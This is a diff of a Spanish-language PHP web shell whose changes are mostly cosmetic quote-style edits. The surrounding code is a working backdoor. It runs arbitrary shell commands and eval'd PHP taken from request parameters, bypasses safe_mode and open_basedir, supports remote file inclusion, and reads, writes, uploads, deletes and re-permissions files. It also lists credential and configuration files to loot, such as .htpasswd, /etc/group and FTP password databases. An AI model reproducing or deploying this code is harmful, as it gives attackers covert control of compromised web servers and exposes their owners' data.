@@ -84,16 +84,16 @@ $clave_usuario = 'a0f1ba7debe4a2049b0f84d7dd95009a812f0b1a'; //"EMeLCo"
 $rfiurl = false;
 
 error_reporting(0); //final
-error_reporting(E_ALL); //desarrollo
+//error_reporting(E_ALL); //desarrollo
 
 /**/ 
 
 // http://securityreason.com/achievement_securityalert/42
-if(strtolower(ini_get("safe_mode"))=="on"){
-    ini_restore("safe_mode");
+if(strtolower(ini_get('safe_mode'))=='on'){
+    ini_restore('safe_mode');
 }
-if($_COOKIE["openBasedirBypass"]=="true"){
-    ini_restore("open_basedir");
+if($_COOKIE['openBasedirBypass']=='true'){
+    ini_restore('open_basedir');
 }
 
 set_time_limit(0);
@@ -120,13 +120,13 @@ if (get_magic_quotes_gpc()) {
 
 //Parcheamos la url para que ande con RFI
 if (!$rfiurl){
-    $rfiurl = "?";
-    $include = "&";
-    foreach (explode("&",getenv("QUERY_STRING")) as $v) {
-        $v = explode("=",$v);
+    $rfiurl = '?';
+    $include = '&';
+    foreach (explode('&',getenv('QUERY_STRING')) as $v) {
+        $v = explode('=',$v);
         $name = urldecode($v[0]);
         $value = urldecode($v[1]);
-        foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) { 
+        foreach (array('http://','https://','ssl://','ftp://','\\') as $needle) { 
             if (strpos($value,$needle) === 0) {
                 $rfiurl .= urlencode($name)."=".urlencode($value)."&";}
         }
@@ -138,8 +138,8 @@ if (!$rfiurl){
 $rfiurl = htmlentities($rfiurl);
 
 
-if (isset($nombre_usuario) and ($nombre_usuario != "")){ //si tiene clave
-    if ( ($_COOKIE["u"] != $nombre_usuario) or ($_COOKIE["c"] != $clave_usuario) ){ //si no está logueado muestra un formulario que pide la clave
+if (isset($nombre_usuario) and ($nombre_usuario != '')){ //si tiene clave
+    if ( ($_COOKIE['u'] != $nombre_usuario) or ($_COOKIE['c'] != $clave_usuario) ){ //si no está logueado muestra un formulario que pide la clave
         echo'
             <html><head><script>
                 function createCookie(name,value,days) {
@@ -172,45 +172,45 @@ if (isset($nombre_usuario) and ($nombre_usuario != "")){ //si tiene clave
 }
 
 // Con esto mostramos las imagenes. Va arriba porque no se puede mandar nada antes
-if ($_GET["w"]=="img"){
+if ($_GET['w']=='img'){
     Header('Content-type: image/gif');
-    if($_GET["imagen"]=="carpeta"){
+    if($_GET['imagen']=='carpeta'){
         die(base64_decode('R0lGODlhEAAQAMQfAOvGUf7ztuvPMf/78/fkl/Pbg+u8Rvjqteu2Pf3zxPz36Pz0z+vTmPzurPvuw/npofbjquvNefHVduuyN+uuMu3Oafbgjfnqvf/3zv/3xevPi+vRjP/20/bmsP///////yH5BAEAAB8ALAAAAAAQABAAAAV24CeOZGmepqeqqOgxjBZFa+19r4ftWQUAgqDgltthMshMIJAZ4jYDHsBARSAmFOJvq+g6HIdEFgcYmBWNxoNAsDjGHgBnmV5bCoUDHLBIq9sFEhIdcAYJdYASFRUQhQkLCwkOFwcdEBAXhVabE52ecDahKy0oIQA7'));
-    }elseif($_GET["imagen"]=="ejecutable"){
+    }elseif($_GET['imagen']=="ejecutable"){
         die(base64_decode('R0lGODlhEAAQAMQfAESUKF/CPoXZVn3VUihXGGXGQU6qL/b79HHNSdTvyy9nHD6HJnfRTYDWVI7eXIrcWonbWXrTT0mhLGnJRG3LRyVPFnTPSzZ0Ib3mr460gLLiocXpuCNMFez46P///////yH5BAEAAB8ALAAAAAAQABAAAAWJ4Pd5ZGl6ougZbCtJALCgo5EdXa53h3ahq4PD8YAIGoMII6EAGjpEoyDJsGwIzk5R4GkoLYgrUNKRkqoIyqYy7giOpfRkDVx0kBESZVIoaDh1HVQeCBN8AX9AFx1faX0BiIAjCgdoewWQARiSHgoZCRuhGxqkGBmSIwQVqxytrqgqJycptLW2HyEAOw=='));
-    }elseif($_GET["imagen"]=="enlace"){
+    }elseif($_GET['imagen']=="enlace"){
         die(base64_decode('R0lGODlhEAAQANUkAHBwcMXFxaioqJqamtHR0XNzc6SkpJeXl6CgoNXV1ZiYmHd3d8fHx6Kioo2NjZubm6GhoX9/f4qKipSUlKenp5CQkJOTk6Ojo3t7e6WlpZ2dnX19fZ+fn4SEhHJycn5+foWFhZ6entra2v///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAACQALAAAAAAQABAAAAZmQJJwSCwaj0jSaMlMjgSUjAGCGB2fI1GCwAg8rEKmYGRAcAYKRWDCHIXe78vyAH8vRXg8SBjJ45cggYEDSwUAh4dtDSMHFRIdHxgBC01hGllbXR5gRSMWDiAbCwWcRm1LSamqq6pBADs='));
-    }elseif($_GET["imagen"]=="flechad"){
+    }elseif($_GET['imagen']=="flechad"){
         die(base64_decode('R0lGODlhEAAQALMLAJLNXpDEaZPNX4/NU5bUWJnXWpDNVIvFWXyuWmOPRf///////wAAAAAAAAAAAAAAACH5BAEAAAsALAAAAAAQABAAAAQvcMlJq704Z6U0VUm3cWC4JWgCmBc4GESxihUIAIGAsHWaHLwaCUU7FUeepHJpiQAAOw=='));
-    }elseif($_GET["imagen"]=="archivo"){
+    }elseif($_GET['imagen']=="archivo"){
         die(base64_decode('R0lGODlhEAAQAMQfAMfj/uzx9rvc/eXt9YivyHaXtFdwkZXK/KvU+0lVa/L2+rba/KTR+4m77FJhe67T5UNLXNXn8MDf/bHX/JrA1qjL3t7n7ykxQz5FVeLp8LDR48vM0Z7O+9Xb5P///////yH5BAEAAB8ALAAAAAAQABAAAAWPoCeO5PidXvRoFUURRCEXHvpEQ5DrQ98YNY9mACgWJUhF4yeqKIwApECgqDpElOdRulhMFFdPdisRdCcIsIjwlJon6HRireB6EQgGYzD3FAJccXocAxAif1N3eQwcHBmGfgFmd4MHBxYYhwpveIwclgGZHgYdCjwZqBkWARsXhwawDg4JCRAQGBgXYSW8JCEAOw=='));
-    }elseif($_GET["imagen"]=="descargar"){
+    }elseif($_GET['imagen']=="descargar"){
         die(base64_decode('R0lGODlhEAAQAMQfAJLNW3aXtJrM++vx9+Xt9YivyKTR+8fj/ldwkUlVa73e/dXb5PH1+mGNRPDx8bPY/Im77H6xW1Jhe7TR4ENLXNXn8PX4+vv7+5rA1qjL3uDo7ykxQz5FVWOPRf///////yH5BAEAAB8ALAAAAAAQABAAAAWWoCeO5PidXjVNGYYVRSAHHjpVxJDrRA8hNc+EcCgWFUgG5CfKWIydaEfBqEpEmGexA4h0HmDG1ZOFdr/hcYFxkAIAUgMjIVorLtw3oHExEOgeAQNJHRERDQ4GfhQigkgPDg2IBgICGoyBg2CQiZWWHI0WCpuKlJUOoB4ICww8BBqwGg4TG40ItxISCQkUFBwcG2MlwyQhADs='));
-    }elseif($_GET["imagen"]=="editar"){
+    }elseif($_GET['imagen']=="editar"){
         die(base64_decode('R0lGODlhEAAQAMQAAGB3lYivyMDf/XiZt+Ts9ajT/Mbh/UlVa/P2+bLY/FRlfu3x9ZzN++Xy/rTR4ENLXN7v/tTk8Jm/1enx96jL3uDo7ykxQz5FVb2JAP+8Bv/RV6HQ/FSr9qfR+jhllf///yH5BAAAAAAALAAAAAAQABAAAAWV4CeOZClGjkNJUhAMsOdJohMRUz4RvNdxntrEQCQKGj6gQkRBFAXHpAex/EicBijy54FQRddslAspfD8BhBZDLpgPovQRo8l0C50NAf4ZLBp0GRhleXoPIn4RdYN4GxsMFYd9CwkKlgoAAwybFReICAkJeAUDAKYAC54fABEIOzwEFbILDhaImJcHBw8PFxcWVSbCIiEAOw=='));
-    }elseif($_GET["imagen"]=="eliminar"){
+    }elseif($_GET['imagen']=="eliminar"){
         die(base64_decode('R0lGODlhEAAQAMQfAPMyMpfL/HSUseYTE/5WVrzd/e3x9eXs9VdwkarU+0pXbbba/ISqxaLQ+/74+MLg/Ym77PD1+v+IiNrf51Jhe0RNX/729rHX/CkxQz9GVsvM0f7IyNRBRuDo8P///////yH5BAEAAB8ALAAAAAAQABAAAAWSoOdYnlie5ac63OBt3MTMQu2p5TAQXhQdwAMEcSsRBoDSY1mIQIYigIsg8TCbPorHMqieHoXCYnGJaL9LsJicMJcYkfT6ckm0Fe84eFy3Nw54HgwGamwJDYgHFSUCBmGGiA0BHYsejXN+kpMZjBFifYgBogacHggTEQZBHawdBhoYjAizFBQKChUVGRkYZyi/wCEAOw=='));
-    }elseif($_GET["imagen"]=="comandos"){
+    }elseif($_GET['imagen']=="comandos"){
         die(base64_decode('R0lGODlhEAAQAMQfAHSUstdxbU1Zbvz9/4CwzVZtjeTs9Njq9+rx9o7B8d7LzbjTsISyhUiCRvb5/K7S5NXd36LQ+7TZ/PP2+sPh/ajL3ikxQz9HV+Hp8Jq/1czkt5PGeDhzKs9XUv///////yH5BAEAAB8ALAAAAAAQABAAAAWSoCeO5Pid3vE8VZYRBCADHvocBuKIgzcZiULN89D1Ap1AwDNAEISeyqDjQXau1M4AiriKlh7vFSK6DhrkMnWa1VIajLB3EWGb3wS5Z9GIOMRaDRsaIg8cDWwiGGYNcgoMbGkAUwMSenUdDhciAA4DlQciB3VNmx4FEBMIBqwYrhgIChacBbUFArgXuhcWAiW/vyEAOw=='));
-    }elseif($_GET["imagen"]=="archivonuevo"){
+    }elseif($_GET['imagen']=="archivonuevo"){
         die(base64_decode('R0lGODlhEAAQANUoAOLp8ElVa0NLXIivyJXK/D5FVYm77N7n7ykxQ5rA1svM0YS8O4C4OJXJSInAP5fLS362N4/ERJLHR5DFRdXb5JbKStXn8HqzM4vAQJ7O+1Jhe1dwkezx9nKsLeXt9XaXtKTR+7HX/PL2+sDf/bvc/avU+7ba/P///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAACgALAAAAAAQABAAAAaXwJNwSByijifLqdM5JQaDj/RzQgofjaFn6zFsqsuKJOJojs4ig1fYmWAWEDOJJKpriIzLcEQymUIid05LZnx+ISWBQgNEc3+IiQGLImd9fyUlICAekicfHJWXmSAZHgJCn46QmhkZAKeeHJaIrAQEBwWoIn2rrbYcuScbFCIcWwDIAAccCgioG9AaGgEBAgIFBQiCRdxEQQA7'));
-    }elseif($_GET["imagen"]=="carpetanueva"){
+    }elseif($_GET['imagen']=="carpetanueva"){
         die(base64_decode('R0lGODlhEAAQANUnAP/3xffkl+vPMfbgjf3zxP7ztvnpofz36PPbg/vuw+3Oaf/78/HVdvbjqvjqtfz0z/bmsPnqvYvAQI/ERJfLS//204nAP5XJSHqzM5bKSoS8O5LHR362N4C4OJDFReu8Ruu2PeuyN+vGUXKsLeuuMvzurP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAACcALAAAAAAQABAAAAaFwNPJRDQJj8ijaTQyJpFFyqX4FC4zm4mlWewSRx6JhtNUiESCtKDbwRQB8EIBsB4umwDRZw8ChUhGXiIHhAkJDgSAQyILjQclJQYBAQMJiiYiFXKQkgMICA6XIg+QkZQIDAwQlx8EnKcMCgoNrAQPDwQJEQ4QDQ0RrH3CIcTFl17IVFXLQQA7'));  
-    }elseif($_GET["imagen"]=="php"){
+    }elseif($_GET['imagen']=="php"){
         die(base64_decode('R0lGODlhEAAQAMQfAOTq8+3x9pSty/L2+26NyLXa/JTI+lZtjYSiuFJrsUlVa8jj/oW05uft9XqVr9TZ6d3h76zU+93n8FJgebLD00NLXGqIqSkxQz5FVb/e/XuZ0MvM0Z/P+0BXo////////yH5BAEAAB8ALAAAAAAQABAAAAWloCeO5PidnoMggrA6sGN5qCA1AZ43DWAcNI8gsCgWM8gBgwH0UAbGBTJTGFibgYAm0ekmCIJCdSKSdDuBcyehiQzIns6gARkEBHMIe6AQdQAdEA1ogxAdBAB9cQEAD4CMEA9sABUiAoBqD2sEHBKVHg0ECVxeBAwGBhIYIhQeVAURERyzqAGrHhYPdjwAvQASARsXIg4HxhMTCgoVFRgYF3Al0iQhADs='));  
-    }elseif($_GET["imagen"]=="derecha"){
+    }elseif($_GET['imagen']=="derecha"){
         die(base64_decode('R0lGODlhEAAQAMQfAJLNW3aXtMfj/pfL/OTr9IivyMvM0Vdwkb7e/UpXbfP2+azU+9Xo9Ovx9u32/mGNRIm77OPx/rXZ/H6xW1Jhe6/S5ERNX5rA1qjL3tvj6ykxQz9GVqDP+2OPRf///////yH5BAEAAB8ALAAAAAAQABAAAAWYoCeO5PidHlNV2HUVRSAHHloxRKM3RE9Ah5qn0hAYjYikAwIUYRRHAaKjdCgoogv0OO1IvtfstkPuALyLsKcAnQLegEknnRCxk4/J5D15CAh1HgENSWVmDxEcBBYig0kMEREdiBwDi42EXwsLHYkDAxkbjQoImgsclZ8Noh4HGQo8Pj0ZDQYajQe5FBQJCRYWGxsaWCXFJSEAOw=='));  
-    }elseif($_GET["imagen"]=="izquierda"){
+    }elseif($_GET['imagen']=="izquierda"){
         die(base64_decode('R0lGODlhEAAQAMQfAHaXtJLNW5fL/OTs9YivyMfj/tXb5Fdwkb3e/anT+0lVa/P2+dTn9Ovx9u32/mGNRIm77LXZ/H6xW1Jhe+Px/rTR4ENLXJrA1qjL3uDo7ykxQz5FVZ/P+2OPRf///////yH5BAEAAB8ALAAAAAAQABAAAAWaoCeO5PidHlNV2HURBCADHloxQ6M3Qz9Ah5qn0igYjYikAwIUYRbHQieJcDgWE9EFauxMEZEwVsvtBLxeRmLsIUAfkoD8TFkrRG4EXC6RdOoDdx4ADUkPAQ9oFBwDFiKESRGJFBQFHBwZjoOFYQkdlhwCAhkbjwtgEQmql6INpR4HBgs8Phm2DRUajwe8ExMKChbCGxpZJcclIQA7'));      
-    }elseif($_GET["imagen"]=="copiar"){
+    }elseif($_GET['imagen']=="copiar"){
         die(base64_decode('R0lGODlhEAAQAMQfAHKQruzx9sfj/uXt9vL2+tXb5MHU4arT+7zd/YmwylVri5XK/IO76EhUaa/S5bPZ/Ha36VRie5/E2Ft6nt/o7ykxQ0FIVz1EVajL332hvNfn8HyjwI7B76HQ+////////yH5BAEAAB8ALAAAAAAQABAAAAWToCeO42een2c4jpRkAOChpudowxDk3FTWjoFAsGq9YrMUhiBg4XQ8X0rC5ASHAgSBw1CIEkzGEqslELwesIBBHSIQjwchItoEEAz1+3E4EBoiAHcQenwHHQOAHgAECBB2e4eIihMFBAaCcIcLCxQWgQoKEYyaHZwBFyQilQQ5FBQBBhVJNQChEQ0NFhcVdCiqwB4hADs='));      
     }else{
         die();
     }
 // Esto es para descargar archivos. Va arriba porque no se puede mandar nada antes
-}elseif (( $_GET["w"] == "descargar" ) and (( $archivo = leerarchivo($_REQUEST["ruta"] ))!==FALSE)){
-    header("Content-type: application/force-download");
-    header('Content-Disposition: attachment; filename="'.urlencode(basename($_REQUEST["ruta"]))."\"\n");
+}elseif (( $_GET['w'] == 'descargar' ) and (( $archivo = leerarchivo($_REQUEST['ruta'] ))!==FALSE)){
+    header('Content-type: application/force-download');
+    header('Content-Disposition: attachment; filename="'.urlencode(basename($_REQUEST['ruta']))."\"\n");
     die($archivo);
 }
 
@@ -325,7 +325,7 @@ echo'
         #phpinfo hr {width: 600px; background-color: #cccccc; border: 0px; height: 1px; color: #000000;}
     </style>    
 </head>
-<body'.(($_COOKIE["lateral"]=="OFF")?" onload=ocultar() ":"").'>
+<body'.(($_COOKIE['lateral']=='OFF')?' onload=ocultar() ':'').'>
     <div class="headoculto contenedorgrande contenedor" id="headoculto">
         <div style="float:left;width:10%;height:100%; position:relative; top:50%;">
             <br><br><br><br>
@@ -359,10 +359,10 @@ echo'
 ';
 
 
-switch($_GET["w"]){
+switch($_GET['w']){
     
     /* Mostramos las directivas mas importantes de php.ini y su explicación */
-    case "directivas";
+    case 'directivas';
         
         /* Creamos un array con todas las directivas y su descripcion */
         
@@ -444,12 +444,12 @@ switch($_GET["w"]){
         
         /* Mostramos toda la información del array */
         foreach ($functions as $funcion){
-            echo $funcion[0].' =&gt; '.$funcion[1].'<br>'."\n";
+            echo $funcion[0].' =&gt; '.$funcion[1].'<br>';
         }
     break;
 
     /* PHPInfo */
-    case "phpinfo":
+    case 'phpinfo':
         /* Mostramos el titulo */
         echo '<div style="text-align:center;">
         <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
@@ -467,7 +467,7 @@ switch($_GET["w"]){
     break;
 
     /* Mas informacion */
-    case "info":
+    case 'info':
         /* Mostramos el titulo */
         echo '<div style="text-align:center;">
         <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
@@ -475,10 +475,10 @@ switch($_GET["w"]){
         
         $ruta = getcwd() or '/';
         
-        if((!ini_get("safe_mode")) or (strtolower(ini_get("safe_mode"))=="off")){
-            $safemode = "No";
+        if((!ini_get('safe_mode')) or (strtolower(ini_get('safe_mode'))=='off')){
+            $safemode = 'No';
         }else{
-            $safemode = "Si";
+            $safemode = 'Si';
         } 
         
         echo 'Ubicaci&oacute;n: '.htmlentities(__FILE__, ENT_QUOTES, 'UTF-8').'<br>
@@ -699,8 +699,8 @@ $comandos =
 /opt/lampp/logs/error_log
 >Usuarios
 <id
-'.archivosdeusuarios("/.bashrc").'
-'.archivosdeusuarios("/public_html/.bashrc").'
+'.archivosdeusuarios('/.bashrc').'
+'.archivosdeusuarios('/public_html/.bashrc').'
 /root/.bashrc
 /root/.bash_logut
 /etc/security/group
@@ -713,7 +713,7 @@ $comandos =
 /etc/group
 ./.htasswd
 ../.htpasswd
-'.archivosdeusuarios("/public_html/.htpasswd").'
+'.archivosdeusuarios('/public_html/.htpasswd').'
 >Configuraci&oacute;n
 /etc/apt/sources.list
 /etc/hosts
@@ -721,7 +721,7 @@ $comandos =
 ../.htaccess
 ../../.htaccess
 ../../../.htaccess
-'.archivosdeusuarios("/public_html/.htaccess").'
+'.archivosdeusuarios('/public_html/.htaccess').'
 /opt/lampp/etc/httpd.conf
 /opt/lampp/etc/my.cnf
 /opt/lampp/etc/php.ini
@@ -731,7 +731,7 @@ $comandos =
 /etc/php.ini
 /usr/lib/php.ini
 /usr/local/lib/php.ini
-'.archivosdeusuarios("/public_html/php.ini").'
+'.archivosdeusuarios('/public_html/php.ini').'
 /etc/httpd.conf
 /etc/pure-ftpd.conf
 /etc/pure-ftpd/pure-ftpd.pdb
@@ -761,21 +761,21 @@ psybnc.conf
     break;
 
     /* Ejecutar comandos */
-    case "shell":
+    case 'shell':
         /* Mostramos el titulo */
         echo '<div style="text-align:center;">
         <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
         </div>';
         
-        $ruta = $_REQUEST["ruta"];
+        $ruta = $_REQUEST['ruta'];
         if (!$ruta){
             $ruta = getcwd();
         }else{
             chdir($ruta);
         }
         
-        if (isset($_REQUEST["comando"])){
-            $cmd = $_REQUEST["comando"];
+        if (isset($_REQUEST['comando'])){
+            $cmd = $_REQUEST['comando'];
             $salida = shell($cmd);
             if (!$salida){ $salida[0]='Imposible de ejecutar'; $salida[1]='Modo: ninguno';}
             
@@ -794,28 +794,28 @@ psybnc.conf
     break;
 
     /* Ejecutar php */
-    case "php":
+    case 'php':
         /* Mostramos el titulo */
         echo '<div style="text-align:center;">
         <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
         </div>';
         
-        $ruta = $_REQUEST["ruta"];
+        $ruta = $_REQUEST['ruta'];
         if (!$ruta){
             $ruta = getcwd();
         }else{
             chdir($ruta);
         }
         
-        if (isset($_POST["codigo"])){
-            $cmd = $_POST["codigo"];
+        if (isset($_POST['codigo'])){
+            $cmd = $_POST['codigo'];
             ob_flush();
             ob_start();
                 eval($cmd);
                 $salida = ob_get_clean();
             ob_end_clean();
             
-            if ($_POST["textarea"]){        ///va el textarea alrededor del resultado?
+            if ($_POST['textarea']){        ///va el textarea alrededor del resultado?
                 $textarea0='<textarea style="width:100%; height:200px; align:left;">';
                 $textarea1='</textarea>';
             }
@@ -836,7 +836,7 @@ psybnc.conf
         <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
         </div>';
         
-        $ruta = $_REQUEST["ruta"];
+        $ruta = $_REQUEST['ruta'];
         if (!$ruta){
             $ruta = getcwd();
         }
@@ -888,13 +888,13 @@ psybnc.conf
     break;
 
     /* Editor de archivos */
-    case "editar":
+    case 'editar':
         /* Mostramos el titulo */
         echo '<div style="text-align:center;">
         <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
         </div>';
         
-        $ruta=$_REQUEST["ruta"].$_REQUEST["ruta2"];
+        $ruta=$_REQUEST['ruta'].$_REQUEST['ruta2'];
         //mostramos el form 
         echo '
             <form action="'.$rfiurl.'w=editar" method="POST" name="editar" default="">
@@ -905,12 +905,12 @@ psybnc.conf
                 <br />
             ';
         
-        switch($_POST["accion"]) {
+        switch($_POST['accion']) {
             
             //escribimos el archivo
-            case "Guardar":
-                if(($ruta!=="") and isset($ruta)){
-                    $contenido = $_POST["contenido"];
+            case 'Guardar':
+                if(($ruta!=='') and isset($ruta)){
+                    $contenido = $_POST['contenido'];
                     $resultado = escribirarchivo($ruta,$contenido);
                     if ($resultado===FALSE){
                         echo '<br><div class="n">Sin permisos de escritura o todas las funciones desactivadas</div>';
@@ -919,46 +919,46 @@ psybnc.conf
             
             //no hay break a proposito, porque despues de escribir el archivo lo quiero leer para comprobar que esté bien guardado
             //leemos el archivo
-            case "Abrir":
+            case 'Abrir':
             default:
                 if (($archivo=leerarchivo($ruta))!==FALSE){
                     $perm = permisos($ruta);
                     //ponemos los colores de los permisos
                     if (is_writable($ruta)){
-                        $colorpermisos = "#8ABD22";
+                        $colorpermisos = '#8ABD22';
                     }else{
-                        $colorpermisos = "#CD2626";
+                        $colorpermisos = '#CD2626';
                     }
                     //mostramos el dueño del archivo
                     $data = posix_getpwuid(fileowner($ruta));
-                    $usuario = $data["name"];
+                    $usuario = $data['name'];
                     $data = posix_getgrgid(filegroup($ruta));
-                    $usuario.= ':'.$data["name"];
+                    $usuario.= ':'.$data['name'];
                     
-                    echo '<br><div style="display:inline;color:'.$colorpermisos.'">('.$perm.')</div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Due&ntilde;o: '.$usuario.'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Modificado: '.date("d/m/Y H:i",filectime($ruta));
+                    echo '<br><div style="display:inline;color:'.$colorpermisos.'">('.$perm.')</div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Due&ntilde;o: '.$usuario.'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Modificado: '.date('d/m/Y H:i',filectime($ruta));
                     
                 }else{
-                    if(($ruta!=="") and isset($ruta) and !isset($_REQUEST["ruta2"])){
+                    if(($ruta!=='') and isset($ruta) and !isset($_REQUEST['ruta2'])){
                         echo '<br><div class="n">Archivo inexistente, sin permisos de lectura o todas las funciones desactivadas</div>';
                     }
                 }
                 
                 break;
                 
-            case "enter":
-                $archivo = $_POST["contenido"];
+            case 'enter':
+                $archivo = $_POST['contenido'];
                 $perm = permisos($ruta);
                 //ponemos los colores de los permisos
                 if (is_writable($ruta)){
-                    $colorpermisos = "#8ABD22";
+                    $colorpermisos = '#8ABD22';
                 }else{
-                    $colorpermisos = "#CD2626";
+                    $colorpermisos = '#CD2626';
                 }
                 //mostramos el dueño del archivo
                 $data = posix_getpwuid(fileowner($ruta));
-                $usuario = $data["name"];
+                $usuario = $data['name'];
                 $data = posix_getgrgid(filegroup($ruta));
-                $usuario.= ':'.$data["name"];
+                $usuario.= ':'.$data['name'];
                 
                 echo '<br><div style="display:inline;color:'.$colorpermisos.'">('.$perm.')</div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Due&ntilde;o: '.$usuario.'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Modificado: '.date("d/m/Y H:i",filectime($ruta));
                 break;
@@ -973,35 +973,35 @@ psybnc.conf
     break;
 
     /* Eliminar archivos */
-    case "eliminar":
+    case 'eliminar':
         /* Mostramos el titulo */
         echo '<div style="text-align:center;">
         <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
         </div>';
         
-        if (isset($_REQUEST["ruta"]) and ($_REQUEST["ruta"]!="")){
-            if (substr($_REQUEST["ruta"],-2)=="/.") $_REQUEST["ruta"] = substr($_REQUEST["ruta"],0,-1);
-            borrar($_REQUEST["ruta"]);
-            if(!file_exists($_REQUEST["ruta"])){
-                echo '<div class="s center">&quot;'.htmlentities($_REQUEST["ruta"],ENT_QUOTES,'UTF-8').'&quot; fue eliminado</div><br><br>';
+        if (isset($_REQUEST['ruta']) and ($_REQUEST['ruta']!='')){
+            if (substr($_REQUEST['ruta'],-2)=='/.') $_REQUEST['ruta'] = substr($_REQUEST['ruta'],0,-1);
+            borrar($_REQUEST['ruta']);
+            if(!file_exists($_REQUEST['ruta'])){
+                echo '<div class="s center">&quot;'.htmlentities($_REQUEST['ruta'],ENT_QUOTES,'UTF-8').'&quot; fue eliminado</div><br><br>';
             }else{
-                echo '<div class="n center">Error eliminando &quot;'.htmlentities($_REQUEST["ruta"],ENT_QUOTES,'UTF-8').'&quot;</div><br><br>';
+                echo '<div class="n center">Error eliminando &quot;'.htmlentities($_REQUEST['ruta'],ENT_QUOTES,'UTF-8').'&quot;</div><br><br>';
             }
         }else{
             echo '<script>document.location="'.$rfiurl.'w=archivos"</script>';
         }
-        echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities(dirname($_REQUEST["ruta"]),ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
+        echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities(dirname($_REQUEST['ruta']),ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
     break;
 
     /* Para crear una carpeta desde el navegador de archivos */
-    case "nuevacarpeta":
+    case 'nuevacarpeta':
         /* Mostramos el titulo */
         echo '<div style="text-align:center;">
         <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
         </div>';
         
-        $ruta=$_REQUEST["ruta"].$_REQUEST["ruta2"];
-        if (isset($ruta) and ($ruta!="")){
+        $ruta=$_REQUEST['ruta'].$_REQUEST['ruta2'];
+        if (isset($ruta) and ($ruta!='')){
             if(mkdir($ruta)){
                 echo '<div class="s center">&quot;'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'&quot; fue creado</div><br><br>';
             }else{
@@ -1010,19 +1010,19 @@ psybnc.conf
         }else{
             echo '<script>document.location="'.$rfiurl.'w=archivos"</script>';
         }
-        echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities($_REQUEST["ruta"],ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
+        echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities($_REQUEST['ruta'],ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
     break;
 
     /* Para subir archivos */
-    case "subir":
+    case 'subir':
         /* Mostramos el titulo */
         echo '<div style="text-align:center;">
         <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
         </div>';
 
-        $ruta = $_POST["ruta"];
+        $ruta = $_POST['ruta'];
         $subio = false;
-        if (isset($ruta) and ($ruta!="")){
+        if (isset($ruta) and ($ruta!='')){
             //esto podria ser un solo if, pero asi es mas facil de debuggear
             if (is_uploaded_file($HTTP_POST_FILES['ruta2']['tmp_name'])) {
                 if(move_uploaded_file($HTTP_POST_FILES['ruta2']['tmp_name'], $ruta.$HTTP_POST_FILES['ruta2']['name'])){
@@ -1043,20 +1043,20 @@ psybnc.conf
         }else{
             echo '<script>document.location="'.$rfiurl.'w=archivos"</script>';
         }
-        echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities($_POST["ruta"],ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
+        echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities($_POST['ruta'],ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
     break;
 
     /* Para chmod, chown y chgrp */
-    case "chmod":
+    case 'chmod':
     /* Mostramos el titulo */
         echo '<div style="text-align:center;">
         <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
         </div>';
         
-        $ruta = $_REQUEST["ruta"];
-        $chmod = $_POST["chmod"];
-        $chgrp = $_POST["chgrp"];
-        $chown = $_POST["chown"];
+        $ruta = $_REQUEST['ruta'];
+        $chmod = $_POST['chmod'];
+        $chgrp = $_POST['chgrp'];
+        $chown = $_POST['chown'];
         $chmod_dec = octdec('0'.$chmod);        //chmod() de php necesita que esté en octal
         
         
@@ -1064,26 +1064,26 @@ psybnc.conf
             
             //sacamos usuario y grupo dueños del archivo
             $data = posix_getpwuid(fileowner($ruta.$barra.$archivo));
-            $usuarioarchivo = $data["name"];
+            $usuarioarchivo = $data['name'];
             $data = posix_getgrgid(filegroup($ruta.$barra.$archivo));
-            $grupoarchivo = $data["name"];
+            $grupoarchivo = $data['name'];
             
